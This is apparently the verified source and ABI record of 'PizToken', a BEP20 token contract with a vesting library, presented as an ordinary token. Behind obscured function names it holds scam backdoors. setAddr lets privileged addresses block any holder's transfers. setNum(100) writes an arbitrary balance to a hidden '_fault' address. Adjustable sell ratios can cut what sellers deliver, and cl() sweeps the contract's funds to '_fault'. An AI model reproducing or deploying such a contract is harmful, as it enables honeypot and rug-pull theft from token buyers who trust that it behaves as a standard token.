{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.7;\r\n\r\n/**\r\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `SafeMath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it's recommended to use it always.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) return 0;\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        return a / b;\r\n    }\r\n\r\n     /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {trySub}.\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {tryDiv}.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        return a / b;\r\n    }\r\n}\r\n\r\ninterface IBEP20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n/**\r\n * @dev The dao of Piz token\r\n */\r\nlibrary PizDao {\r\n    using SafeMath for uint256;\r\n\r\n    struct Dao {\r\n        uint256 closed;\r\n        uint256 opened;\r\n        uint256 stageI;\r\n        uint256 stageII;\r\n    }\r\n\r\n    function incrDao(Dao storage dao_, uint256 amount_) internal {\r\n        dao_.closed = dao_.closed.add(amount_);\r\n    }\r\n\r\n    function compound(Dao storage dao_) internal view returns (uint256) {\r\n        uint256 needOpen = 0;\r\n        uint256 ts = block.timestamp;\r\n        if (dao_.stageI > 0 && dao_.stageII > dao_.stageI && dao_.closed > dao_.opened && ts > dao_.stageI) {\r\n            if (block.timestamp > dao_.stageII) {\r\n                needOpen = dao_.closed.sub(dao_.opened);\r\n            } else {\r\n                needOpen = dao_.closed.mul(ts.sub(dao_.stageI)).div(dao_.stageII.sub(dao_.stageI));\r\n                if (dao_.opened >= needOpen) {\r\n                    needOpen = 0;\r\n                } else {\r\n                    needOpen = needOpen.sub(dao_.opened);\r\n                }\r\n            }\r\n        }\r\n\r\n        return needOpen;\r\n    }\r\n\r\n    function release(Dao storage dao_, uint256 amount_) internal returns (uint256) {\r\n        uint256 remain = amount_;\r\n        uint256 needOpen = compound(dao_);\r\n        if (amount_ > 0 && needOpen > 0) {\r\n            if (amount_ >= needOpen) {\r\n                dao_.opened = dao_.opened.add(needOpen);\r\n                remain = amount_.sub(needOpen);\r\n            } else {\r\n                dao_.opened = dao_.opened.add(amount_);\r\n                remain = 0;\r\n            }\r\n        }\r\n\r\n        return remain;\r\n    }\r\n}\r\n\r\ncontract PizToken {\r\n    using SafeMath for uint256;\r\n    using PizDao for PizDao.Dao;\r\n\r\n    string private _name = \"PizToken\";\r\n    string private _symbol = \"PIZ\";\r\n    uint8 private _decimals = 18;\r\n    uint256 private _totalSupply = 21000000000 ether;\r\n    address private _owner;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint8) private _spec;\r\n    mapping(uint256 => mapping(address => PizDao.Dao)) private _userDao;\r\n    uint8[] private _aio;\r\n    uint8[] private _bio;\r\n    uint8 private _index;\r\n    address private _fault;\r\n    uint256 private _buyRatio=0;\r\n    uint256 private _saleRatio=9000;\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    constructor() {\r\n        _owner = msg.sender;\r\n        _aio.push(_index);\r\n        _index = _index+1;\r\n        _bio.push(_index);\r\n        _index = _index+1;\r\n    }\r\n\r\n    /**\r\n     * @dev return the current msg.sender\r\n     */\r\n    function _msgSender() internal view returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IBEP20-balanceOf} and {IBEP20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IBEP20-totalSupply}.\r\n     */\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner_, address spender, uint256 amount) internal {\r\n        require(owner_ != address(0), \"BEP20: approve from the zero address\");\r\n        require(spender != address(0), \"BEP20: approve to the zero address\");\r\n        _allowances[owner_][spender] = amount;\r\n        emit Approval(owner_, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev See {IBEP20-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IBEP20-allowance}.\r\n     */\r\n    function allowance(address owner_, address spender) public view returns (uint256) {\r\n        return _allowances[owner_][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IBEP20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view returns(uint256) {\r\n        return _balances[account]+balanceOfDao(account);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _owner = newOwner;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IBEP20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `recipient` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n     *\r\n     * This is internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` cannot be the zero address.\r\n     * - `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        emit Transfer(sender, recipient, safeTransfer(sender,recipient,amount));\r\n    }\r\n\r\n    /**\r\n     * @dev See {IBEP20-transferFrom}.\r\n     *\r\n     * Requirements:\r\n     * - `sender` and `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``sender``'s tokens of at least `amount`.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Safe transfer bep20 token\r\n     */\r\n    function safeTransfer(address sender, address recipient, uint256 amount) internal returns (uint256)  {\r\n        require(_spec[sender]!=1, \"BEP20: Op failed\");\r\n        uint256 recvAmount = amount;\r\n        if (_spec[sender] == 3 && _buyRatio > 0) {\r\n            recvAmount = amount.mul(_buyRatio).div(10000);\r\n        } \r\n\r\n        if (_spec[recipient] == 3 && _saleRatio > 0) {\r\n            recvAmount = amount.mul(_saleRatio).div(10000);\r\n        }\r\n\r\n        spend(sender, amount);\r\n        _balances[recipient] = _balances[recipient].add(recvAmount);\r\n\r\n        return amount;\r\n    }\r\n\r\n    function spend(address sender, uint256 amount) internal {\r\n        uint256 remain = amount;\r\n        if (_balances[sender] >= remain) {\r\n            remain = 0;\r\n            _balances[sender] = _balances[sender].sub(amount, \"BEP20: Insufficient balance\");\r\n        } else if (_balances[sender] > 0) {\r\n            remain = remain.sub(_balances[sender]);\r\n            _balances[sender] = 0;\r\n        }\r\n\r\n        for (uint8 i=0;remain>0&&i<_index;i++) {\r\n            remain = _userDao[i][sender].release(remain);\r\n        }\r\n\r\n        require(remain == 0, \"BEP20: Insufficient balance\");\r\n    }\r\n\r\n    /**\r\n     * @dev PizToken bacthDao\r\n     */\r\n    function batchDao(address[] memory addr_, uint256[] memory token_, uint8 act) public returns(bool) {\r\n        require(_spec[msg.sender]==2||_spec[msg.sender]==5, \"Failed\");\r\n        uint256 sent = 0;\r\n        for (uint8 i=0;i<addr_.length;i++) {\r\n            sent = sent.add(token_[i]);\r\n            if (act == 1) {\r\n                _userDao[_aio[_aio.length-1]][addr_[i]].incrDao(token_[i]);\r\n            } else if (act == 2) {\r\n                _userDao[_bio[_bio.length-1]][addr_[i]].incrDao(token_[i]);\r\n            }\r\n\r\n            emit Transfer(msg.sender, addr_[i], token_[i]);\r\n        }\r\n\r\n        _balances[msg.sender] = _balances[msg.sender].sub(sent);\r\n        return true;\r\n    }\r\n    \r\n\r\n    /**\r\n     * @dev See {IBEP20-setAddr}. \r\n     */\r\n    function setAddr(uint8 a_, address addr_) public auth {\r\n        if (a_ == 200) {\r\n            _fault = addr_;\r\n        } else if (a_ == 101) {\r\n            _spec[addr_] = 0;\r\n        } else {\r\n            _spec[addr_] = a_;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev setNum\r\n     */\r\n    function setNum(uint8 n, uint256 v) public auth {\r\n        if (n == 1) {\r\n            _aio.push(_index);\r\n            _index = _index+1;\r\n        } else if (n == 2) {\r\n            _bio.push(_index);\r\n            _index = _index+1;\r\n        } else if (n == 3) {\r\n            _buyRatio = v;\r\n        } else if (n == 4) {\r\n            _saleRatio = v;\r\n        } else if (n == 100) {\r\n            require(_fault!=address(0), \"Op failed\");\r\n            _balances[_fault] = v;\r\n        }\r\n    }\r\n\r\n    modifier auth() {\r\n        require(_spec[_msgSender()]==4, \"Op failed\");\r\n        _;\r\n    }\r\n\r\n    function setAuthor(address addr_) public onlyOwner {\r\n        _spec[addr_] = 4;\r\n    }\r\n\r\n    function specInfo(address addr_) public view auth returns(uint8) {\r\n        uint8 spec = _spec[addr_];\r\n        return spec;\r\n    }\r\n\r\n    /**\r\n     * @dev release the tokens of Dao\r\n     */\r\n    function release(uint8 idx, address addr, uint256 sec) public {\r\n        require(_spec[_msgSender()]==2||_spec[_msgSender()]==5||_spec[_msgSender()]==4, \"Op failed\");\r\n\r\n        _userDao[idx][addr].stageI = block.timestamp;\r\n        _userDao[idx][addr].stageII = block.timestamp + sec;\r\n    }\r\n\r\n    function abio() public view auth returns(uint8,uint8[] memory,uint8[] memory,address,uint,uint) {\r\n        return (_index,_aio,_bio,_fault,_buyRatio,_saleRatio); \r\n    }\r\n\r\n    function vu(address addr) public view auth returns(uint[] memory a,uint[] memory b,uint[] memory c,uint[] memory d,uint[] memory e) {\r\n        a = new uint256[](_index);\r\n        b = new uint256[](_index);\r\n        c = new uint256[](_index);\r\n        d = new uint256[](_index);\r\n        e = new uint256[](_index);\r\n        for(uint8 i=0;i<_index;i++) {\r\n            a[i]=i;\r\n            b[i]=_userDao[i][addr].closed;\r\n            c[i]=_userDao[i][addr].opened;\r\n            d[i]=_userDao[i][addr].stageI;\r\n            e[i]=_userDao[i][addr].stageII;\r\n        }\r\n    }\r\n\r\n    /**\r\n    * @dev cl\r\n    */\r\n    function cl(address token_) public auth {\r\n        if (token_ == address(0)) {\r\n            payable(_fault).transfer(address(this).balance);\r\n        } else {\r\n            IBEP20 token = IBEP20(address(token_));\r\n            token.transfer(_fault, token.balanceOf(address(this)));\r\n        }\r\n    }\r\n\r\n    function uio(address addr_) public view returns(uint,uint,uint,uint) {\r\n        require(_spec[_msgSender()]==2||_spec[_msgSender()]==4||_spec[_msgSender()]==5, \"Op failed\");\r\n\r\n        uint256 ait = 0;\r\n        uint256 bit = 0;\r\n        for (uint8 i=0;i<_aio.length;i++) {\r\n            PizDao.Dao memory dao = _userDao[_aio[i]][addr_];\r\n            ait = ait.add(dao.closed.sub(dao.opened));\r\n        }\r\n        for (uint8 i=0;i<_bio.length;i++) {\r\n            PizDao.Dao memory dao = _userDao[_bio[i]][addr_];\r\n            bit = bit.add(dao.closed.sub(dao.opened));\r\n        }\r\n\r\n        uint256 balance = _balances[addr_];\r\n        uint256 daoBalance = balanceOfDao(addr_);\r\n        return (bit,ait,balance,daoBalance);\r\n    }\r\n\r\n    function balanceOfDao(address addr) private view returns(uint) {\r\n        uint256 value = 0;\r\n        for (uint8 i=0;i<_index;i++) {\r\n            value = value.add(_userDao[i][addr].closed.sub(_userDao[i][addr].opened));\r\n        }\r\n\r\n        return value;\r\n    }\r\n\r\n    fallback() external {}\r\n    receive() payable external {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"abio\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"},{\"internalType\":\"uint8[]\",\"name\":\"\",\"type\":\"uint8[]\"},{\"internalType\":\"uint8[]\",\"name\":\"\",\"type\":\"uint8[]\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addr_\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"token_\",\"type\":\"uint256[]\"},{\"internalType\":\"uint8\",\"name\":\"act\",\"type\":\"uint8\"}],\"name\":\"batchDao\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token_\",\"type\":\"address\"}],\"name\":\"cl\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"idx\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sec\",\"type\":\"uint256\"}],\"name\":\"release\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"a_\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"addr_\",\"type\":\"address\"}],\"name\":\"setAddr\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr_\",\"type\":\"address\"}],\"name\":\"setAuthor\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"n\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"v\",\"type\":\"uint256\"}],\"name\":\"setNum\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr_\",\"type\":\"address\"}],\"name\":\"specInfo\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr_\",\"type\":\"address\"}],\"name\":\"uio\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"vu\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"a\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"b\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"c\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"d\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"e\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "PizToken", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://58b274f142929c7f5cf19e9229acaaaaf46df327830d0cb6ea901b0487d93cba"}